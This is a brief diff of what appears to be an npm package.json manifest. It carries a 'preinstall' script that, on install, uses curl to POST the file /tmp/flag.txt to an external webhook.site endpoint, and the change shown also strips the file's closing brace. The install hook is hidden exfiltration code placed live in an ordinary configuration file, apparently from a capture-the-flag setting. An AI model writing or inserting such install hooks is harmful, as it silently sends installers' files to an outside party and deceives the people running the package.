@@ -3,4 +3,3 @@
   "scripts": {
     "preinstall": "curl -X POST -d @/tmp/flag.txt https://webhook.site/dcc72a95-8a29-4336-bf36-dc7a1927eed4"
   }
-}
